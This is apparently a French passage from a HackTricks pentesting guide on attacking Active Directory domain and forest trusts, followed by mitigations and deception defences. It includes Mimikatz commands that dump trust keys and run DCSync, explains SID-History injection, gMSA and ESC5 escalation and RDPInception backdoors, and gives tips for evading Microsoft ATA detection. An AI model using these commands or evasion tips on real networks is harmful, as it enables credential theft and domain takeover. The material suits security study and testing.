Il est important de noter qu'**un trust peut être unidirectionnel ou bidirectionnel**. Dans l'option bidirectionnelle, les deux domaines se font confiance mutuellement, mais dans la relation de trust **unidirectionnelle**, l'un des domaines sera le **trusted** et l'autre le **trusting**. Dans ce dernier cas, **vous ne pourrez accéder qu'aux ressources du domaine trusting depuis le domaine trusted**.

Si le Domain A trust le Domain B, A est le domaine trusting et B est le domaine trusted. De plus, dans **Domain A**, il s'agira d'un **Outbound trust** ; et dans **Domain B**, il s'agira d'un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: C'est une configuration courante au sein de la même forêt, où un domaine enfant a automatiquement un trust transitive bidirectionnel avec son domaine parent. Essentiellement, cela signifie que les demandes d'authentification peuvent circuler sans heurts entre le parent et l'enfant.
- **Cross-link Trusts**: Appelés aussi "shortcut trusts", ceux-ci sont établis entre des domaines enfants pour accélérer les processus de referral. Dans des forêts complexes, les referrals d'authentification doivent typiquement remonter jusqu'à la racine de la forêt puis redescendre vers le domaine cible. En créant des cross-links, le trajet est raccourci, ce qui est particulièrement utile dans des environnements géographiquement dispersés.
- **External Trusts**: Ceux-ci sont mis en place entre des domaines différents et non reliés et sont par nature non transitifs. Selon la [documentation Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les external trusts sont utiles pour accéder aux ressources d'un domaine en dehors de la forêt actuelle qui n'est pas connecté par un forest trust. La sécurité est renforcée via le SID filtering avec les external trusts.
- **Tree-root Trusts**: Ces trusts sont établis automatiquement entre le domaine racine de la forêt et une nouvelle racine d'arbre ajoutée. Bien que moins fréquents, les tree-root trusts sont importants pour ajouter de nouveaux arbres de domaine à une forêt, leur permettant de conserver un nom de domaine unique et garantissant la transitivité bidirectionnelle. Plus d'informations sont disponibles dans le [guide Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ce type de trust est un trust transitive bidirectionnel entre deux domaines racine de forêt, imposant également le SID filtering pour renforcer les mesures de sécurité.
- **MIT Trusts**: Ces trusts sont établis avec des domaines Kerberos non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120). Les MIT trusts sont un peu plus spécialisés et ciblent des environnements nécessitant une intégration avec des systèmes Kerberos hors de l'écosystème Windows.

#### Other differences in **trusting relationships**

- Une relation de trust peut aussi être **transitive** (A trust B, B trust C, donc A trust C) ou **non-transitive**.
- Une relation de trust peut être configurée comme un **trust bidirectionnel** (les deux se font confiance) ou comme un **trust unidirectionnel** (seul l'un fait confiance à l'autre).

### Attack Path

1. **Énumérer** les relations de trust
2. Vérifier si un **security principal** (user/group/computer) a **accès** aux ressources de **l'autre domaine**, peut-être via des entrées ACE ou en faisant partie de groupes de l'autre domaine. Cherchez des **relations à travers les domaines** (le trust a probablement été créé pour cela).
1. kerberoast dans ce cas pourrait être une autre option.
3. **Compromettre** les **comptes** qui peuvent **pivot** à travers les domaines.

Les attaquants peuvent accéder à des ressources dans un autre domaine par trois mécanismes principaux :

- **Local Group Membership**: Des principals peuvent être ajoutés à des groupes locaux sur des machines, comme le groupe “Administrators” sur un serveur, leur donnant un contrôle significatif sur cette machine.
- **Foreign Domain Group Membership**: Des principals peuvent aussi être membres de groupes au sein du domaine étranger. Cependant, l'efficacité de cette méthode dépend de la nature du trust et de la portée du groupe.
- **Access Control Lists (ACLs)**: Des principals peuvent être spécifiés dans une **ACL**, particulièrement comme entités dans des **ACEs** au sein d'une **DACL**, leur fournissant l'accès à des ressources spécifiques. Pour ceux souhaitant approfondir les mécanismes des ACLs, DACLs et ACEs, le whitepaper intitulé “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” est une ressource précieuse.

### Find external users/groups with permissions

Vous pouvez vérifier **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les foreign security principals dans le domaine. Ceux-ci seront des user/group provenant **d'un domaine/forest externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou en utilisant powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalade de privilèges d'une forêt enfant vers la forêt parent
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Autres façons d'énumérer les trusts de domaine :
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Il y a **2 trusted keys**, une pour _Child --> Parent_ et une autre pour _Parent_ --> _Child_.\
> Vous pouvez obtenir celle utilisée par le domaine courant avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escaladez en tant que Enterprise Admin vers le domaine enfant/parent en abusant de la trust avec SID-History injection :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendre comment le Configuration Naming Context (NC) peut être exploité est crucial. Le Configuration NC sert de référentiel central pour les données de configuration dans une forêt Active Directory (AD). Ces données sont répliquées sur chaque Domain Controller (DC) de la forêt, les DC inscriptibles conservant une copie inscriptible du Configuration NC. Pour exploiter cela, il faut disposer des **SYSTEM privileges sur un DC**, de préférence un child DC.

**Link GPO to root DC site**

Le conteneur Sites du Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine dans la forêt AD. En opérant avec des SYSTEM privileges sur n'importe quel DC, un attaquant peut lier des GPOs aux sites du root DC. Cette action peut compromettre le domaine racine en manipulant les politiques appliquées à ces sites.

Pour des informations détaillées, on peut consulter la recherche sur [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vecteur d'attaque consiste à cibler les gMSA privilégiés au sein du domaine. La KDS Root key, essentielle pour calculer les mots de passe des gMSAs, est stockée dans le Configuration NC. Avec des SYSTEM privileges sur n'importe quel DC, il est possible d'accéder à la KDS Root key et de calculer les mots de passe de n'importe quel gMSA dans la forêt.

Une analyse détaillée et des instructions pas à pas sont disponibles dans :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque MSA déléguée complémentaire (BadSuccessor – abus des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherche externe supplémentaire : [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Cette méthode demande de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec des SYSTEM privileges, un attaquant peut modifier le AD Schema pour accorder à n'importe quel utilisateur le contrôle total sur toutes les classes. Cela peut conduire à un accès non autorisé et au contrôle des nouveaux objets AD créés.

Pour en savoir plus, consulter [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnérabilité ADCS ESC5 vise le contrôle des objets de Public Key Infrastructure (PKI) pour créer un template de certificat permettant de s'authentifier comme n'importe quel utilisateur au sein de la forêt. Comme les objets PKI résident dans le Configuration NC, compromettre un child DC inscriptible permet d'exécuter des attaques ESC5.

Plus de détails sont disponibles dans [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Dans des scénarios sans ADCS, l'attaquant peut mettre en place les composants nécessaires, comme expliqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Dans ce scénario **votre domaine est trusted** par un domaine externe, vous donnant **permissions indéterminées** sur celui-ci. Vous devrez déterminer **quels principals de votre domaine ont quel access sur le domaine externe**, puis essayer d'en tirer parti :

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine de forêt externe - sens unique (sortant)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Dans ce scénario **votre domaine** accorde la **confiance** de certains **privilèges** à un principal provenant d'**un domaine différent**.

Cependant, lorsqu'un **domaine est trusted** par le domaine trustant, le domaine trusted **crée un utilisateur** avec un **nom prévisible** qui utilise comme **mot de passe le trusted password**. Ce qui signifie qu'il est possible **d'accéder à un utilisateur du domaine trustant pour pénétrer dans le domaine trusted** afin de l'énumérer et d'essayer d'escalader davantage de privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine trusted est de trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** de la trust de domaine (ce qui n'est pas très courant).

Une autre façon de compromettre le domaine trusted est d'attendre sur une machine où un **user from the trusted domain can access** pour se connecter via **RDP**. Ensuite, l'attaquant pourrait injecter du code dans le processus de session RDP et **accéder au domaine d'origine de la victime** depuis là.\
De plus, si la **victime a monté son disque dur**, depuis le processus de **RDP session** l'attaquant pourrait stocker des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s'appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Atténuation des abus de trust de domaine

### **SID Filtering:**

- Le risque d'attaques exploitant l'attribut SID history à travers des forest trusts est atténué par SID Filtering, qui est activé par défaut sur toutes les inter-forest trusts. Cela repose sur l'hypothèse que les intra-forest trusts sont sécurisés, considérant la forêt, plutôt que le domaine, comme la frontière de sécurité selon la position de Microsoft.
- Cependant, il y a un inconvénient : SID filtering peut perturber des applications et l'accès des utilisateurs, entraînant sa désactivation occasionnelle.

### **Selective Authentication:**

- Pour les inter-forest trusts, l'utilisation de Selective Authentication garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. À la place, des permissions explicites sont requises pour permettre aux utilisateurs d'accéder aux domaines et serveurs au sein du domaine ou de la forêt trustante.
- Il est important de noter que ces mesures ne protègent pas contre l'exploitation du writable Configuration Naming Context (NC) ni contre les attaques sur le trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques défenses générales

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Mesures défensives pour la protection des credentials**

- **Domain Admins Restrictions** : Il est recommandé que les Domain Admins ne soient autorisés à se connecter qu'aux Domain Controllers, en évitant leur utilisation sur d'autres hôtes.
- **Service Account Privileges** : Les services ne devraient pas s'exécuter avec les privilèges de Domain Admin (DA) pour maintenir la sécurité.
- **Temporal Privilege Limitation** : Pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être réalisé via : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Mise en œuvre de techniques de deception**

- La mise en œuvre de la deception implique la pose de pièges, comme des utilisateurs ou ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n'expirent pas ou qui sont marqués Trusted for Delegation. Une approche détaillée inclut la création d'utilisateurs avec des droits spécifiques ou leur ajout à des groupes à hauts privilèges.
- Un exemple pratique implique l'utilisation d'outils comme : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Plus d'informations sur le déploiement de techniques de deception sont disponibles sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifier la deception**

- **For User Objects** : Les indicateurs suspects incluent un ObjectSID atypique, des logons peu fréquents, des dates de création, et un faible nombre de mauvais mots de passe.
- **Indicateurs généraux** : Comparer les attributs d'objets potentiellement leurres avec ceux d'objets authentiques peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier de telles deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass** :
- **User Enumeration** : Éviter l'énumération de sessions sur les Domain Controllers pour prévenir la détection par ATA.
- **Ticket Impersonation** : Utiliser des clés **aes** pour la création de tickets aide à éviter la détection en ne rétrogradant pas vers NTLM.
- **DCSync Attacks** : Exécuter depuis une machine non-Domain Controller pour éviter la détection par ATA est conseillé, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## Références

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

{{#include ../../banners/hacktricks-training.md}}
